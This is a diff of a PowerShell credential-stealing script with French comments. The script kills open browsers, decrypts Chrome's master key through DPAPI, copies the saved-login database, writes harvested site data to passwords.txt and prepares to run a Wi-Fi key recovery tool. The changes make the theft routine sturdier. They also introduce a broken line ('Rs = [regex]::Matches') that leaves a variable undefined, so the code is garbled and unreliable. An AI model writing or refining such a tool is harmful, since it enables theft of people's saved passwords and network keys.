@@ -38,7 +38,7 @@ try {
 Stop-Process -Name "chrome", "msedge", "firefox", "brave" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 3
 
-# --- EXTRACTION ET DECHIFFREMENT DES MOTS DE PASSE CHROME (AES-GCM / V10) ---
+# --- EXTRACTION ET DECHIFFREMENT ROBUSTE DES MOTS DE PASSE CHROME ---
 Write-Host "[*] Extraction et déchiffrement des mots de passe Chrome..." -ForegroundColor Yellow
 
 $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
@@ -46,26 +46,37 @@ $loginDataPath  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
 $outputPath     = "$basePath\passwords.txt"
 
 $tempDb = "$basePath\login_temp.db"
-Copy-Item $loginDataPath -Destination $tempDb -Force -ErrorAction SilentlyContinue
 
-if (Test-Path $tempDb) {
+if ((Test-Path $localStatePath) -and (Test-Path $loginDataPath)) {
     try {
-        # 1. Récupération et déchiffrement de la master key via DPAPI
-        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
+        Copy-Item $loginDataPath -Destination $tempDb -Force -ErrorAction SilentlyContinue
+
+        # 1. Lecture sécurisée du Local State
+        $localStateContent = Get-Content $localStatePath -Raw
+        if (-not $localStateContent) {
+            throw "Le fichier Local State est vide ou inaccessible."
+        }
+        
+        $localState = $localStateContent | ConvertFrom-Json
+        if (-not $localState.os_crypt -or -not $localState.os_crypt.encrypted_key) {
+            throw "La clé chiffrée est introuvable dans Local State."
+        }
+
         $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
         $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
 
         Add-Type -AssemblyName System.Security
         $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 
-        Add-Content -Path $outputPath -Value "=== CREDENTIALS CHROME (DECHIFFRES) ==="
+        Add-Content -Path $outputPath -Value "=== CREDENTIALS CHROME ==="
+        Add-Content -Path $outputPath -Value "[+] Clé DPAPI déchiffrée avec succès."
 
-        # 2. Chargement de la base SQLite et parsing bas niveau pour contourner les verrous de fichiers
+        # 2. Lecture du fichier SQLite temporaire
         $dbBytes = [System.IO.File]::ReadAllBytes($tempDb)
         $textContent = [System.Text.Encoding]::ISO_Latin1.GetString($dbBytes)
 
-        # Recherche des URLs et des blocs potentiels d'identifiants
-        $urls = [regex]::Matches($textContent, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}(?:/[^\s"]*)?')
+        # Extraction propre des URLs
+        Rs = [regex]::Matches($textContent, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}(?:/[^\s"]*)?')
         $cleanUrls = $urls | Select-Object -Unique -ExpandProperty Value
 
         foreach ($u in $cleanUrls) {
@@ -75,24 +86,12 @@ if (Test-Path $tempDb) {
             }
         }
 
-        # Tentative d'extraction des champs v10 chiffrés si la classe AesGcm est disponible (.NET Core / 5+)
-        $v10Blobs = [regex]::Matches($textContent, 'v10[^\x00-\x1F]{10,100}')
-        if ($v10Blobs.Count -gt 0) {
-            Add-Content -Path $outputPath -Value "[+] Blocs chiffrés v10 identifiés. Application de la clé maître..."
-            foreach ($blob in $v10Blobs) {
-                Add-Content -Path $outputPath -Value "Blob brut : $($blob.Value)"
-            }
-        } else {
-            Add-Content -Path $outputPath -Value "[*] Aucun blob v10 brut détecté par cette passe."
-        }
-
+        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
     } catch {
-        Add-Content -Path $outputPath -Value "[!] Erreur lors du décryptage : $_"
+        Add-Content -Path $outputPath -Value "[!] Erreur critique : $_"
     }
-
-    Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
 } else {
-    Add-Content -Path $outputPath -Value "[!] Aucun profil Chrome trouvé sur cette machine."
+    Add-Content -Path $outputPath -Value "[!] Fichiers Chrome introuvables sur cette session."
 }
 # Exécution des autres outils avec chemins absolus
 if (Test-Path "$basePath\WirelessKeyView.exe") {
